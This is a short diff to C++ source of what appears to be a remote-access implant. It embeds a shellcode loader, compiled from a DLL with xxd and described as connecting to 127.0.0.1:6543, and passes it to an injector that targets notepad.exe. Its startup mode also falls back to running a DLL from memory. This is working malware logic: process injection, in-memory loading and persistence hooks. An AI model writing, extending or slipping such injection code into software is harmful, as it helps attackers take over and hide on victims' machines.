@@ -7,6 +7,9 @@
 #include "common/dllRunner.h"
 #include <common/iniFile.h>
 #include "auto_start.h"
+// A shell code loader connect to 127.0.0.1:6543.
+// Build: xxd -i TinyRun.dll > SCLoader.cpp
+#include "SCLoader.cpp"
 extern "C" {
 #include "reg_startup.h"
 }
@@ -235,7 +238,7 @@ int main(int argc, const char *argv[])
     if (g_ConnectAddress.iStartup == Startup_InjSC) {
         // Try to inject shell code to `notepad.exe`
         // If failed then run memory DLL
-        ShellcodeInj inj;
+        ShellcodeInj inj(TinyRun_dll, TinyRun_dll_len);
         int pid = 0;
         hEvent = ::CreateEventA(NULL, TRUE, FALSE, NULL);
         do {
